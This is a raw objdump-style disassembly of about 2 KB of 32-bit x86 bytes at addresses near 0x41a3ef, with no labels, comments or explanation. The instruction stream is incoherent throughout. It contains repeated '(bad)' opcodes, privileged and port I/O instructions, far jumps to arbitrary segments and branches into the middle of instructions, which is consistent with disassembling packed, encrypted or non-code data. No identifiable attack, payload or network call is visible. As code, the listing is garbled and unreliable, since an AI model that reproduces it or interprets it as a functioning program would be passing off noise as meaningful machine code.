  41a3ef:	jo     0x41a397
  41a3f1:	(bad)  
  41a3f2:	jb     0x41a455
  41a3f4:	into   
  41a3f5:	rol    BYTE PTR [esi-0x5c212fea],0x76
  41a3fc:	retf   
  41a3fd:	push   ebp
  41a3fe:	ss jne 0x41a477
  41a401:	inc    ebp
  41a402:	sub    al,0x33
  41a404:	add    DWORD PTR [edx],0x8ba7fa3e
  41a40a:	xchg   ebp,eax
  41a40b:	je     0x41a476
  41a40d:	xor    eax,0xbd492040
  41a412:	xchg   esp,eax
  41a413:	jecxz  0x41a453
  41a415:	adc    BYTE PTR [esi+0x2b],0x42
  41a419:	mov    ebp,0xc777bb70
  41a41e:	imul   ebp,DWORD PTR [ecx-0x77],0xffffffe4
  41a422:	or     eax,0x58831efe
  41a427:	inc    esp
  41a428:	pushf  
  41a429:	xchg   edi,eax
  41a42a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a42b:	mov    al,ds:0x690dddfe
  41a430:	test   BYTE PTR [esi+0x3b],ch
  41a433:	ror    DWORD PTR [edi],0xce
  41a436:	xchg   ecx,eax
  41a437:	cmp    ch,dh
  41a439:	jmp    0x41a3e4
  41a43b:	add    dh,dl
  41a43d:	lods   al,BYTE PTR ds:[esi]
  41a43e:	mov    esi,0x21e28648
  41a443:	sbb    al,0xc1
  41a445:	stos   BYTE PTR es:[edi],al
  41a446:	jnp    0x41a41c
  41a448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a449:	das    
  41a44a:	jnp    0x41a447
  41a44c:	sub    al,0x10
  41a44e:	dec    ecx
  41a44f:	mov    esi,0x9ab17100
  41a454:	mov    WORD PTR [edi-0x17eb44e1],es
  41a45a:	cdq    
  41a45b:	xchg   edi,eax
  41a45c:	repz (bad) 
  41a45e:	xchg   ebx,eax
  41a45f:	rcr    bh,1
  41a461:	enter  0x4b9c,0x55
  41a465:	dec    edx
  41a466:	push   esi
  41a467:	rol    DWORD PTR [edx-0x7cd00b50],1
  41a46d:	enter  0x6141,0x5b
  41a471:	jge    0x41a47c
  41a473:	xchg   edx,eax
  41a474:	sahf   
  41a475:	push   0xb2ba33be
  41a47a:	out    0x28,eax
  41a47c:	cmp    edi,ecx
  41a47e:	inc    edi
  41a47f:	fmul   st(4),st
  41a481:	sbb    ecx,DWORD PTR [ecx+0x21]
  41a484:	push   esi
  41a485:	lahf   
  41a486:	mov    ebp,eax
  41a488:	mov    ecx,DWORD PTR [ebx]
  41a48a:	imul   esp,edx,0xfd451372
  41a490:	inc    esp
  41a491:	sbb    eax,0xeae66b8b
  41a496:	sldt   WORD PTR [eax]
	...
  41a511:	add    BYTE PTR [eax],al
  41a513:	add    BYTE PTR [esi-0x77],bl
  41a516:	add    eax,0x7feed766
  41a51b:	mov    ecx,0x4f6277d8
  41a520:	scas   eax,DWORD PTR es:[edi]
  41a521:	mov    BYTE PTR [edi],bh
  41a523:	call   0x76b:0x144b3
  41a52a:	add    BYTE PTR [eax],al
  41a52c:	add    ecx,DWORD PTR [ebp-0x589df289]
  41a532:	dec    esp
  41a533:	pop    ebx
  41a534:	cmp    al,0x46
  41a536:	fbld   TBYTE PTR [edx+0x1474c4e4]
  41a53c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53d:	add    DWORD PTR [ebx],esi
  41a53f:	leave  
  41a540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a541:	cwde   
  41a542:	out    dx,al
  41a543:	cs inc edi
  41a545:	and    ah,BYTE PTR [ebp+ecx*8+0x56]
  41a549:	or     BYTE PTR [edi+0xd],ah
  41a54c:	mov    dh,0xe9
  41a54e:	jmp    0x28b35527
  41a553:	and    edi,DWORD PTR [esi-0x6c]
  41a556:	fstp   QWORD PTR [ebx+0x7844b2cc]
  41a55c:	lds    esp,FWORD PTR [esp+esi*4+0x104dfea9]
  41a563:	lds    edx,FWORD PTR [ecx]
  41a565:	(bad)
  41a568:	rcr    bl,cl
  41a56a:	in     al,0xd1
  41a56c:	fdiv   DWORD PTR [edi+0x1fb2da52]
  41a572:	mov    cl,BYTE PTR [edx]
  41a574:	push   cs
  41a575:	ins    DWORD PTR es:[edi],dx
  41a576:	add    ch,bl
  41a578:	imul   eax,DWORD PTR [ebx-0x53],0x253e697d
  41a57f:	push   ebx
  41a580:	xor    edx,DWORD PTR [eax]
  41a582:	jge    0x41a535
  41a584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a585:	mov    edi,0x704fa58
  41a58a:	sti    
  41a58b:	jmp    DWORD PTR [edi]
  41a58d:	into   
  41a58e:	cmp    BYTE PTR [ecx],bh
  41a590:	rol    BYTE PTR [ebx+0x32],0x91
  41a594:	fwait
  41a595:	jle    0x41a597
  41a597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a598:	jl     0x41a5e8
  41a59a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a59c:	jbe    0x41a562
  41a59e:	dec    edx
  41a59f:	loope  0x41a616
  41a5a1:	ds xchg edi,eax
  41a5a3:	test   DWORD PTR ds:0x6c697371,ebx
  41a5a9:	xor    BYTE PTR [edx+edi*8-0x5b],dh
  41a5ad:	fs stos DWORD PTR es:[edi],eax
  41a5af:	shl    BYTE PTR [edx+0x70],1
  41a5b2:	sbb    DWORD PTR [edx-0x16099e1b],0x3f
  41a5b9:	in     eax,0x8
  41a5bb:	dec    ecx
  41a5bc:	push   0x15
  41a5be:	mov    DWORD PTR [edx-0x1db282f5],edi
  41a5c4:	pop    ds
  41a5c5:	xchg   edi,eax
  41a5c6:	adc    dl,BYTE PTR [edx+0x6f]
  41a5c9:	sbb    eax,0xc00c91ff
  41a5ce:	sbb    eax,DWORD PTR [ebp+0x5ffa4370]
  41a5d4:	xchg   ecx,eax
  41a5d5:	stos   DWORD PTR es:[edi],eax
  41a5d6:	jp     0x41a63e
  41a5d8:	pop    edx
  41a5d9:	sub    ebp,esp
  41a5db:	outs   dx,DWORD PTR ds:[esi]
  41a5dc:	dec    esi
  41a5dd:	into   
  41a5de:	lods   eax,DWORD PTR ds:[esi]
  41a5df:	cwde   
  41a5e0:	xor    edx,edi
  41a5e2:	cdq    
  41a5e3:	lahf   
  41a5e4:	ficomp WORD PTR [ebx+edi*4-0x3e]
  41a5e8:	xchg   esi,eax
  41a5e9:	test   BYTE PTR [edi],cl
  41a5eb:	shr    DWORD PTR [eax+0x7],cl
  41a5ee:	aad    0x6d
  41a5f0:	and    eax,0xd23825e3
  41a5f5:	sub    eax,0xc3aa63a0
  41a5fa:	hlt    
  41a5fb:	jns    0x41a5b0
  41a5fd:	sar    DWORD PTR [edi+esi*2+0x49],1
  41a601:	inc    esp
  41a602:	imul   esp,DWORD PTR ds:0xacf2316d,0xbebbcc09
  41a60c:	nop
  41a60d:	and    ebx,DWORD PTR [edi]
  41a60f:	push   es
  41a610:	push   esi
  41a611:	or     DWORD PTR [ebp+0x35],edi
  41a614:	add    al,0xb6
  41a616:	repz retf 
  41a618:	inc    esp
  41a619:	mov    ah,0xd7
  41a61b:	or     ebp,edi
  41a61d:	or     BYTE PTR [ecx-0x2],0x8b
  41a621:	ret    
  41a622:	jge    0x41a5b2
  41a624:	test   BYTE PTR [ebx+0x0],cl
  41a627:	cmc    
  41a628:	jg     0x41a666
  41a62a:	je     0x41a619
  41a62c:	popa   
  41a62d:	aam    0x94
  41a62f:	sbb    DWORD PTR [esi-0x78daf353],edi
  41a635:	dec    esi
  41a636:	cwde   
  41a637:	and    al,0xef
  41a639:	mov    ds:0xf8323b68,al
  41a63e:	loope  0x41a633
  41a640:	mov    dh,BYTE PTR [ebp-0x1d9d5e74]
  41a646:	pusha  
  41a647:	bound  eax,QWORD PTR [eax+ecx*8-0x45]
  41a64b:	xchg   BYTE PTR [ebp+esi*8+0x7a],dh
  41a64f:	into   
  41a650:	jg     0x41a6c8
  41a652:	jmp    eax
  41a654:	pop    eax
  41a655:	sti    
  41a656:	jl     0x41a682
  41a658:	loopne 0x41a6c5
  41a65a:	xchg   esp,eax
  41a65b:	scas   al,BYTE PTR es:[edi]
  41a65c:	int3   
  41a65d:	mov    al,0x36
  41a65f:	fst    QWORD PTR [ebp+0x6ccb1397]
  41a665:	bound  ebx,QWORD PTR [edx-0x55]
  41a668:	sbb    ch,dl
  41a66a:	mov    ebp,0x8d235718
  41a66f:	mov    esi,0xf5790d1
  41a674:	jle    0x41a662
  41a676:	iret   
  41a677:	das    
  41a678:	repnz retf 0x279d
  41a67c:	mov    eax,ds:0x8392ea50
  41a681:	dec    ebp
  41a682:	cmp    al,0x20
  41a684:	idiv   BYTE PTR [esi-0x71]
  41a687:	iret   
  41a688:	in     al,dx
  41a689:	mov    ebx,0x75a790dc
  41a68e:	lods   eax,DWORD PTR ds:[esi]
  41a68f:	pop    edi
  41a691:	mov    eax,ds:0x35e083c8
  41a696:	pop    eax
  41a697:	cmp    ah,BYTE PTR [ebx-0x14]
  41a69a:	inc    eax
  41a69b:	jae    0x41a6b3
  41a69d:	mov    edi,0x119bf148
  41a6a2:	add    ch,BYTE PTR [ecx-0x5898ccd]
  41a6a8:	xor    DWORD PTR [ecx],edx
  41a6aa:	stc    
  41a6ab:	fdiv   QWORD PTR [esi]
  41a6ad:	xor    eax,0x9ac8337b
  41a6b2:	sub    ecx,DWORD PTR [ebx+edi*2]
  41a6b5:	push   0x63
  41a6b7:	ja     0x41a6f2
  41a6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ba:	int3   
  41a6bb:	mov    edx,0xf20f1a23
  41a6c0:	fwait
  41a6c1:	xor    al,0x18
  41a6c3:	add    ch,bh
  41a6c5:	(bad)  
  41a6c6:	pop    esp
  41a6c7:	mov    bh,0xef
  41a6c9:	mov    eax,ebp
  41a6cb:	loope  0x41a74a
  41a6cd:	nop
  41a6ce:	int    0x1e
  41a6d0:	daa    
  41a6d1:	and    eax,DWORD PTR [ecx-0xd]
  41a6d4:	es push 0x5f
  41a6d7:	sbb    edi,DWORD PTR ds:[ebx+0x5f]
  41a6db:	mov    ds:0xb4326176,eax
  41a6e0:	sub    ebx,edx
  41a6e2:	xor    ebp,esi
  41a6e4:	lods   al,BYTE PTR ds:[esi]
  41a6e5:	shl    ch,0xe2
  41a6e8:	in     eax,0x1a
  41a6ea:	dec    ecx
  41a6eb:	rcr    BYTE PTR [esp+ecx*2+0x4b],0xc3
  41a6f0:	sub    eax,0x6fb4ab59
  41a6f5:	fistp  QWORD PTR [ebp-0x33]
  41a6f8:	stos   DWORD PTR es:[edi],eax
  41a6f9:	popa   
  41a6fa:	cwde   
  41a6fb:	jbe    0x41a757
  41a6fd:	popf   
  41a6fe:	dec    edx
  41a6ff:	fs loop 0x41a71e
  41a702:	inc    edx
  41a703:	mov    esi,0xf115c321
  41a708:	test   eax,0x6ea378ee
  41a70d:	and    esp,DWORD PTR [ebp+edi*2-0x71cbf48c]
  41a714:	push   0xffffff9f
  41a716:	cli    
  41a717:	(bad)  
  41a718:	shl    BYTE PTR [ebx-0x36c73ed3],1
  41a71e:	mov    ds:0xde3f96af,al
  41a723:	icebp  
  41a724:	xchg   BYTE PTR [ebx-0x145d3486],bl
  41a72a:	push   0xffffffab
  41a72c:	retf   0x1315
  41a72f:	push   ss
  41a730:	call   0x15b8:0x93c41136
  41a737:	adc    esp,DWORD PTR gs:[ecx+0xa]
  41a73b:	shl    BYTE PTR [ebp-0x2a543bf2],0xf3
  41a742:	cli    
  41a743:	mov    al,0x71
  41a745:	sbb    bh,BYTE PTR [eax+0x7c]
  41a748:	shr    DWORD PTR [edx],1
  41a74a:	into   
  41a74b:	repz lds esi,FWORD PTR [edx+0x1]
  41a74f:	clc    
  41a750:	adc    al,BYTE PTR [esp+edi*2+0x1c]
  41a754:	retf   
  41a755:	dec    ebx
  41a756:	mov    ebp,ecx
  41a758:	dec    esp
  41a759:	repnz mov esi,0x9df5dfa9
  41a75f:	dec    esp
  41a760:	xchg   ah,dh
  41a762:	mov    DWORD PTR [esi+edx*8-0x1329434e],eax
  41a769:	xchg   DWORD PTR [esp],edi
  41a76c:	inc    edx
  41a76d:	and    eax,0xc9ee8b87
  41a772:	or     al,0x3e
  41a774:	xchg   DWORD PTR [edx-0x5e6dcfb],ebx
  41a77a:	lods   al,BYTE PTR ds:[esi]
  41a77b:	in     eax,dx
  41a77c:	inc    eax
  41a77d:	inc    edx
  41a77e:	cwde   
  41a77f:	mov    eax,ds:0x92fa29e4
  41a784:	test   eax,0xec3ed767
  41a789:	or     DWORD PTR [eax-0x4c],edi
  41a78c:	pop    eax
  41a78d:	enter  0x2077,0x6c
  41a791:	mov    dl,0xeb
  41a793:	loopne 0x41a730
  41a795:	sbb    eax,0xb54b89bc
  41a79a:	shl    DWORD PTR [esi],cl
  41a79c:	adc    edx,edx
  41a79e:	jmp    0x46d08333
  41a7a3:	jo     0x41a804
  41a7a5:	enter  0x530d,0xfb
  41a7a9:	and    DWORD PTR [esi-0x25],edi
  41a7ac:	adc    ebp,DWORD PTR [ecx-0x9a68e9a]
  41a7b2:	xor    esi,DWORD PTR [ebx+0x27130b2b]
  41a7b8:	retf   
  41a7b9:	push   esi
  41a7ba:	fdivr  QWORD PTR [ebx]
  41a7bc:	push   edx
  41a7bd:	imul   ebp
  41a7bf:	push   eax
  41a7c0:	in     al,dx
  41a7c1:	sub    BYTE PTR [eax],ch
  41a7c3:	and    BYTE PTR [edx],cl
  41a7c5:	pushf  
  41a7c6:	fnsave [eax+edi*1-0x5127d4fe]
  41a7cd:	ret    0xee0b
  41a7d0:	sahf   
  41a7d1:	shr    DWORD PTR [esi+0x4],cl
  41a7d4:	inc    ebp
  41a7d5:	inc    ebx
  41a7d6:	sbb    DWORD PTR [ebx+0x7c],0x443b1efb
  41a7dd:	mov    ebp,0x16f6e0c9
  41a7e2:	or     ch,BYTE PTR [esi+0x18]
  41a7e5:	aas    
  41a7e6:	les    esp,FWORD PTR [ebx]
  41a7e8:	(bad)  
  41a7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7ea:	in     eax,0x20
  41a7ec:	pop    gs
  41a7ee:	push   0xffffffaa
  41a7f0:	sbb    edx,DWORD PTR [ebx+eiz*2+0x312a442a]
  41a7f7:	cs mov esp,0x885a40b5
  41a7fd:	(bad)  
  41a7fe:	sub    DWORD PTR ds:0x2527ea6,edx
  41a804:	cmp    eax,0x8c67c5c2
  41a809:	ss jmp 0x41a7db
  41a80c:	data16 and ah,bl
  41a80f:	std    
  41a810:	imul   ebx,ebp,0xffffffb2
  41a813:	dec    edi
  41a814:	ror    BYTE PTR [ebx-0x55],1
  41a817:	inc    esi
  41a818:	adc    DWORD PTR [esi+0x42],edi
  41a81b:	fadd   DWORD PTR [ebx-0x7c16e1d]
  41a821:	mov    dh,0xb1
  41a823:	les    ebx,FWORD PTR [edx]
  41a825:	xchg   DWORD PTR [eax+0x674254ce],ebx
  41a82b:	mov    ebp,0xcbbddd5
  41a830:	add    ebp,ebx
  41a832:	or     dl,ch
  41a834:	and    eax,0x160bae15
  41a839:	pop    ss
  41a83a:	mov    bl,0x75
  41a83c:	mov    al,ds:0xad57c115
  41a841:	push   ebx
  41a842:	(bad)  
  41a843:	mov    ecx,0x34b8d2ac
  41a848:	pop    edi
  41a849:	ds call 0x21c17d22
  41a84f:	cmp    eax,DWORD PTR [ebx-0x4ac967e0]
  41a855:	mov    ds:0xc1819c22,al
  41a85a:	add    eax,0x8f46b19c
  41a85f:	sbb    eax,0x8028ddf5
  41a864:	mov    ch,0xc3
  41a866:	or     ecx,edi
  41a868:	mov    esp,0x4c8add7f
  41a86d:	jbe    0x41a881
  41a86f:	leave  
  41a870:	jl     0x41a8b4
  41a872:	popa   
  41a873:	test   al,0x93
  41a875:	xlat   BYTE PTR ds:[ebx]
  41a876:	adc    DWORD PTR [edx+0x44],ecx
  41a879:	outs   dx,BYTE PTR ds:[esi]
  41a87a:	pop    esp
  41a87b:	cdq    
  41a87c:	test   DWORD PTR [eax-0x7f3457b5],eax
  41a882:	aaa    
  41a883:	out    dx,eax
  41a884:	mov    al,0x2
  41a886:	jmp    0x43dd:0x3f41a144
  41a88d:	dec    edx
  41a88e:	and    eax,0x34d3c00
  41a893:	xor    DWORD PTR [esi-0x21],0x2ed6b9a7
  41a89a:	jecxz  0x41a8b3
  41a89c:	adc    dl,dl
  41a89e:	lods   al,BYTE PTR ds:[esi]
  41a89f:	xchg   esp,eax
  41a8a0:	stc    
  41a8a1:	sbb    al,0x3d
  41a8a3:	add    ch,dh
  41a8a5:	xor    BYTE PTR [esi-0x2d],ch
  41a8a8:	cmp    al,0x8c
  41a8aa:	push   es
  41a8ab:	cmp    DWORD PTR [edi+0x6956aded],0x62
  41a8b2:	outs   dx,DWORD PTR ds:[esi]
  41a8b3:	mov    ecx,0x6ef2547
  41a8b8:	call   0xd60fde3b
  41a8bd:	fiadd  DWORD PTR [ebp+0x602c9080]
  41a8c3:	sub    ah,BYTE PTR [ebp+0x58]
  41a8c6:	xchg   esi,eax
  41a8c7:	or     bh,BYTE PTR [esp+eiz*2]
  41a8ca:	mov    ds:0x222a9f44,al
  41a8cf:	mov    ebx,0x9252f78b
  41a8d4:	push   ebp
  41a8d5:	(bad)  
  41a8d6:	jmp    0x41a89f
  41a8d8:	jmp    0x41a8e4
  41a8da:	push   edx
  41a8db:	mov    WORD PTR [ebp+0x62],cs
  41a8de:	test   al,0xb4
  41a8e0:	pop    ebp
  41a8e1:	aam    0x77
  41a8e3:	and    BYTE PTR [ecx],al
  41a8e5:	scas   eax,DWORD PTR es:[edi]
  41a8e6:	mov    eax,ds:0x5164a0e3
  41a8eb:	xlat   BYTE PTR ds:[ebx]
  41a8ec:	aad    0x8
  41a8ee:	xor    al,0xeb
  41a8f0:	and    al,0x33
  41a8f3:	inc    edx
  41a8f4:	inc    ecx
  41a8f5:	dec    ebp
  41a8f6:	xor    cl,BYTE PTR [ebx-0x6d]
  41a8f9:	pop    ds
  41a8fa:	cli    
  41a8fb:	jg     0x41a966
  41a8fd:	lods   eax,DWORD PTR ds:[esi]
  41a8fe:	pop    ss
  41a8ff:	bound  ebx,QWORD PTR [edx]
  41a901:	enter  0xc2ef,0xf1
  41a905:	adc    ecx,edi
  41a907:	loope  0x41a8e4
  41a909:	ins    BYTE PTR es:[edi],dx
  41a90a:	jmp    0x41a927
  41a90c:	jp     0x41a96b
  41a90e:	push   ss
  41a90f:	mov    al,ds:0xc0cdfe31
  41a914:	mov    cl,0x3f
  41a916:	daa    
  41a917:	lahf   
  41a918:	ja     0x41a98e
  41a91a:	test   DWORD PTR [eax+0x4d29337b],esp
  41a920:	mov    ebx,0xff9461c5
  41a925:	xlat   BYTE PTR ds:[ebx]
  41a926:	shl    al,1
  41a928:	jmp    0xb1ad:0xe52dfe63
  41a92f:	sub    al,0xf4
  41a931:	repnz mov ds:0x3693f2e2,al
  41a937:	inc    esi
  41a938:	and    ch,0x69
  41a93b:	fsubr  QWORD PTR [esi+eax*8+0x6b3b215e]
  41a942:	jb     0x41a968
  41a944:	push   edi
  41a945:	pop    ebp
  41a946:	jo     0x41a964
  41a948:	sub    ecx,DWORD PTR [ebx-0x773fe911]
  41a94e:	jo     0x41a929
  41a950:	pop    ss
  41a951:	push   0x61
  41a953:	call   0xd3ba513b
  41a958:	repnz xchg ecx,eax
  41a95a:	lock sbb eax,0xe9d1f05a
  41a960:	xor    cl,bl
  41a962:	scas   al,BYTE PTR es:[edi]
  41a963:	in     al,dx
  41a964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a965:	jo     0x41a9e6
  41a967:	(bad)  
  41a968:	hlt    
  41a969:	xchg   ebp,eax
  41a96a:	lods   al,BYTE PTR ds:[esi]
  41a96b:	or     eax,0xb72c4b31
  41a970:	fstp   DWORD PTR ds:0x5709818b
  41a976:	lds    ebx,FWORD PTR [ebp+0x20afb23]
  41a97c:	cwde   
  41a97d:	ror    BYTE PTR [edx+ebp*4],cl
  41a980:	and    ah,bh
  41a982:	mov    bh,0xc5
  41a984:	gs mov ecx,0xee8eb464
  41a98a:	sub    DWORD PTR [ecx-0x1e917d3f],0xf18dc56c
  41a994:	xor    ah,BYTE PTR [edx+eax*1-0x422a2bac]
  41a99b:	add    BYTE PTR [edx+0x8],al
  41a99e:	sbb    DWORD PTR [ebx-0x2de3ca34],edi
  41a9a4:	daa    
  41a9a5:	jno    0x41a92c
  41a9a7:	lahf   
  41a9a8:	add    edi,esp
  41a9aa:	dec    ebp
  41a9ab:	xchg   ebx,eax
  41a9ac:	pushf  
  41a9ad:	mov    dh,0xd2
  41a9af:	iret   
  41a9b0:	adc    esp,DWORD PTR [esi+ecx*2]
  41a9b3:	pop    esi
  41a9b4:	push   eax
  41a9b5:	sub    DWORD PTR [eax],ebp
  41a9b7:	jo     0x41a983
  41a9b9:	into   
  41a9ba:	in     al,dx
  41a9bb:	push   eax
  41a9bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9bd:	jns    0x41a998
  41a9bf:	mov    WORD PTR [edi+0x6],?
  41a9c2:	push   ss
  41a9c3:	jbe    0x41aa18
  41a9c5:	pop    ss
  41a9c6:	add    al,0x9a
  41a9c8:	xor    DWORD PTR [eax+0x69],ecx
  41a9cb:	mov    ebp,0x8023d8ab
  41a9d0:	sub    eax,0x393a3d74
  41a9d5:	rol    DWORD PTR [edi-0x5c64f4ac],cl
  41a9db:	scas   eax,DWORD PTR es:[edi]
  41a9dc:	pushf  
  41a9dd:	and    ecx,esi
  41a9df:	scas   al,BYTE PTR es:[edi]
  41a9e0:	sbb    DWORD PTR [edx],edx
  41a9e2:	sbb    DWORD PTR [edi-0xe3e67e4],ecx
  41a9e8:	mov    dl,0x68
  41a9ea:	mov    eax,ds:0x8b4093c4
  41a9ef:	into   
  41a9f0:	(bad)  
  41a9f2:	push   es
  41a9f3:	xor    al,0x7d
  41a9f5:	dec    cx
  41a9f7:	iret   
  41a9f8:	mov    esi,0xd78fba76
  41a9fd:	push   ss
  41a9fe:	rol    DWORD PTR [ebx],cl
  41aa00:	fwait
  41aa01:	pop    esp
  41aa02:	js     0x41aa63
  41aa04:	adc    al,0xb9
  41aa06:	retf   0x608a
  41aa09:	(bad)  
  41aa0a:	leave  
  41aa0b:	mov    ecx,0x63f1e9b7
  41aa10:	ja     0x41aa6f
  41aa12:	(bad)  
  41aa13:	pusha  
  41aa14:	adc    BYTE PTR [ebp+0x6cda99be],0xa8
  41aa1b:	xchg   edi,eax
  41aa1c:	iret   
  41aa1d:	cld    
  41aa1e:	mov    al,ds:0x860635dc
  41aa23:	mov    bh,0xaf
  41aa25:	xor    BYTE PTR ds:0x558c69f9,dh
  41aa2b:	nop
  41aa2c:	fidiv  DWORD PTR [edi-0x1eb66aed]
  41aa32:	int3   
  41aa33:	dec    edi
  41aa34:	sar    BYTE PTR [ebp-0x5],cl
  41aa37:	test   edx,ebp
  41aa39:	pop    eax
  41aa3a:	xor    eax,0x67a72332
  41aa3f:	push   eax
  41aa40:	push   ebp
  41aa41:	repz popa 
  41aa43:	inc    ebp
  41aa44:	jge    0x41a9e6
  41aa46:	add    al,0xd5
  41aa48:	in     al,0x33
  41aa4a:	rcl    DWORD PTR [esi+0x62],cl
  41aa4d:	hlt    
  41aa4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa4f:	inc    ebx
  41aa50:	fild   DWORD PTR [eax-0xf0c6e1]
  41aa56:	lahf   
  41aa57:	push   cs
  41aa58:	ret    0xf0b6
  41aa5b:	shl    ebp,cl
  41aa5d:	mov    eax,esi
  41aa5f:	dec    ecx
  41aa60:	popa   
  41aa61:	mov    al,0x42
  41aa63:	pop    esp
  41aa64:	xchg   edx,eax
  41aa65:	in     eax,0x4
  41aa67:	and    al,0x55
  41aa69:	add    DWORD PTR [esi],eax
  41aa6b:	xor    eax,0x4eb8ff6a
  41aa70:	jb     0x41aa34
  41aa72:	loope  0x41aa45
  41aa74:	sbb    ecx,DWORD PTR [edx]
  41aa76:	jno    0x41aa01
  41aa78:	xor    al,0xde
  41aa7a:	inc    esi
  41aa7b:	push   0x4a
  41aa7d:	and    eax,0xedd3f822
  41aa82:	scas   al,BYTE PTR es:[edi]
  41aa83:	and    eax,0x87d715e6
  41aa88:	out    dx,eax
  41aa89:	sti    
  41aa8a:	cld    
  41aa8b:	jmp    0x41aad2
  41aa8d:	sbb    BYTE PTR [eax-0x6b],bh
  41aa90:	cmp    al,0x86
  41aa92:	jmp    0x41aab7
  41aa94:	shr    BYTE PTR [ebx+0x3e],cl
  41aa97:	dec    ecx
  41aa98:	inc    eax
  41aa99:	xchg   ebp,eax
  41aa9a:	push   eax
  41aa9b:	stos   BYTE PTR es:[edi],al
  41aa9c:	fidivr WORD PTR [ecx+ecx*4-0x31b23024]
  41aaa3:	out    dx,al
  41aaa4:	push   esp
  41aaa5:	or     al,0xdf
  41aaa7:	or     eax,0xf5807056
  41aaac:	push   edi
  41aaad:	add    al,0x51
  41aaaf:	dec    esp
  41aab0:	sub    al,0x58
  41aab2:	es ss ss fcomp DWORD PTR fs:[ebp+0x6c]
  41aab9:	xchg   edx,eax
  41aaba:	xchg   edi,eax
  41aabb:	hlt    
  41aabc:	push   ss
  41aabd:	mov    DWORD PTR [eax+0x59ab27b5],ebp
  41aac3:	into   
  41aac4:	(bad)  
  41aac5:	mov    ch,0xd0
  41aac7:	(bad)  
  41aac8:	pop    ds
  41aac9:	out    0xa6,eax
  41aacb:	add    DWORD PTR [edi+0x2aca1465],ebx
  41aad1:	xchg   ebp,eax
  41aad2:	dec    ebx
  41aad3:	mov    ecx,0xddfe600b
  41aad8:	dec    ecx
  41aad9:	xor    ah,BYTE PTR [eax]
  41aadb:	call   0xf3f3:0x3bc71565
  41aae2:	add    eax,0xffffffbe
  41aae5:	imul   esp,DWORD PTR [eax-0x48440812],0xffffffcc
  41aaec:	jecxz  0x41aac2
  41aaee:	push   es
  41aaef:	xor    DWORD PTR [ecx],ebp
  41aaf1:	imul   eax,DWORD PTR [eax+edx*4-0x612ace4c],0xe27d4fbf
  41aafc:	xlat   BYTE PTR ds:[ebx]
  41aafd:	addr16 loope 0x41ab6e
  41ab00:	stc    
  41ab01:	push   ss
  41ab02:	adc    eax,0x967a5221
  41ab07:	mov    edx,0xc5bb042
  41ab0c:	xor    dl,BYTE PTR [edi]
  41ab0e:	and    BYTE PTR [ecx],dh
  41ab10:	pop    esi
  41ab11:	stos   DWORD PTR es:[edi],eax
  41ab12:	jmp    0xfdf4:0xae5e565d
  41ab19:	int3   
  41ab1a:	adc    ebp,ebx
  41ab1c:	push   eax
  41ab1d:	aaa    
  41ab1e:	xchg   BYTE PTR [ecx],ch
  41ab20:	mov    bl,0x5d
  41ab22:	mov    eax,ds:0x7757db63
  41ab27:	retf   
  41ab28:	mov    ds:0x366b6e6c,al
  41ab2d:	aad    0x86
  41ab2f:	movmskps edx,xmm2
  41ab32:	add    BYTE PTR [ecx-0x51],ch
  41ab35:	dec    edx
  41ab36:	int    0xef
  41ab38:	icebp  
  41ab39:	and    bl,BYTE PTR [edi+eax*4-0x46b58301]
  41ab40:	std    
  41ab41:	sub    eax,DWORD PTR [eax-0x70482094]
  41ab47:	ins    DWORD PTR es:[edi],dx
  41ab48:	pop    es
  41ab49:	push   eax
  41ab4a:	loope  0x41aace
  41ab4c:	jg     0x41aaf2
  41ab4e:	push   cs
  41ab4f:	dec    eax
  41ab50:	shl    edi,cl
  41ab52:	adc    edx,ebp
  41ab54:	jae    0x41ab3d
  41ab56:	dec    eax
  41ab57:	add    BYTE PTR [edi-0x3d67d59a],al
  41ab5d:	sub    BYTE PTR [ebp-0xfa94fa6],ah
  41ab63:	sbb    BYTE PTR [esp+edi*2+0x6bc4ac4a],bh
  41ab6a:	mov    ecx,0xdf1de9b9
  41ab6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab70:	push   0xffffffbd
  41ab72:	sub    BYTE PTR [esi],0x18
  41ab75:	sub    ebp,edx
  41ab77:	add    al,BYTE PTR [ebp+0x4f5a7d25]
  41ab7d:	push   es
  41ab7e:	and    eax,0x38199c27
  41ab83:	push   0x3c591c03
  41ab88:	mov    edx,0x856fe21b
  41ab8d:	cmc    
  41ab8e:	aas    
  41ab8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab90:	pop    ebp
  41ab91:	xchg   esp,eax
  41ab92:	iret   
  41ab93:	ins    BYTE PTR es:[edi],dx
  41ab94:	sub    DWORD PTR [esi-0x16dad224],ecx
  41ab9a:	(bad)  
  41ab9b:	jg     0x41ab41
  41ab9d:	inc    esi
  41ab9e:	mov    ebp,0xe0c59733
  41aba3:	data16 jae 0x41abee
  41aba6:	xor    ecx,DWORD PTR [ecx-0x6cdcc555]
  41abac:	ja     0x41ac0c
  41abae:	xchg   DWORD PTR [eax+0x36],ecx
  41abb1:	and    esp,esp
  41abb3:	push   ebx
  41abb4:	xor    esp,DWORD PTR [eax]
  41abb6:	sub    DWORD PTR [ecx],0xe9e2227f
  41abbc:	and    BYTE PTR [edi+0x3a1c62be],ch
  41abc2:	inc    edi
  41abc3:	out    0x1,eax
  41abc5:	adc    cl,BYTE PTR ds:0xeb826843
  41abcb:	xchg   esi,eax
  41abcc:	call   0x91940741
  41abd1:	leave  
  41abd2:	add    eax,0x4f968a2
  41abd7:	jmp    0x41ab59
  41abd9:	dec    edx
  41abda:	es pop ebx
  41abdc:	xor    DWORD PTR [ebx],esp
  41abde:	add    DWORD PTR [edx+0x24],0x48
  41abe2:	adc    DWORD PTR [esi+0x291a8002],ebp
